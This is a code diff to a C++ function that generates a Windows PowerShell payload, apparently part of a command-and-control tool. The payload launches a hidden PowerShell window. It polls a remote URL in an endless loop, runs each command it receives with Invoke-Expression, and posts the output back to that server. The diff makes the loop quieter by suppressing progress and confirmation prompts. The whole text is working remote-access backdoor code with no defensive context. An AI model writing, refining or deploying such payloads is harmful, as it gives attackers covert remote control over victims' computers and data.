@@ -58,19 +58,23 @@ string payload_generator_windows(const string& url) {
 
     // Construct the PowerShell payload string
     string payload =
-    "Start-Process $PSHOME\\powershell.exe -ArgumentList{$username=$env:USERNAME; while ($true) { try { "
-    "$response = Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" -WebSession $session -ErrorAction Stop; "
-    "$command = $response.Content.Trim(); "
-    "if ($command -and $command.ToLower() -ne 'exit') { try { "
+    "Start-Process $PSHOME\\powershell.exe -ArgumentList{$ProgressPreference = 'SilentlyContinue'; "
+    "$ConfirmPreference = 'None'; $username=$env:USERNAME; while ($true) { try { "
+    "$response = Invoke-WebRequest -UseBasicParsing -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" "
+    "-WebSession $session -ErrorAction Stop; $command = $response.Content.Trim(); "
+    "if ($command) { Write-Host \"[+] Received: $command\" -ForegroundColor Cyan; "
+    "if ($command.ToLower() -ne 'exit') { try { "
     "$output = Invoke-Expression -Command $command 2>&1 | Out-String; "
     "$body = @{ Result = $output }; "
-    "try { Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" -WebSession $session -Method Post -Body $body "
-    "-ContentType \"application/x-www-form-urlencoded\" -TimeoutSec 5 -ErrorAction Stop | Out-Null } "
+    "try { Invoke-WebRequest -UseBasicParsing -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" "
+    "-WebSession $session -Method Post -Body $body -ContentType \"application/x-www-form-urlencoded\" "
+    "-TimeoutSec 5 -ErrorAction Stop | Out-Null } "
     "catch [System.Net.WebException] { } catch { } } "
     "catch { $errorBody = @{ Result = 'ERROR: $_' }; "
-    "Invoke-WebRequest -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" -WebSession $session -Method Post -Body $errorBody "
-    "-ContentType \"application/x-www-form-urlencoded\" | Out-Null } } "
-    "} catch [System.Net.WebException] { Start-Sleep -Seconds 1; continue } catch { } Start-Sleep -Milliseconds 500 }} -WindowStyle Hidden";
+    "Invoke-WebRequest -UseBasicParsing -Uri \"" + clean_url + "/" + endpoint1 + "?user=$username\" "
+    "-WebSession $session -Method Post -Body $errorBody -ContentType \"application/x-www-form-urlencoded\" "
+    "| Out-Null } } } } catch [System.Net.WebException] { Start-Sleep -Seconds 1; continue } "
+    "catch { } Start-Sleep -Milliseconds 500 }} -WindowStyle Hidden";
 
     return payload;
 }
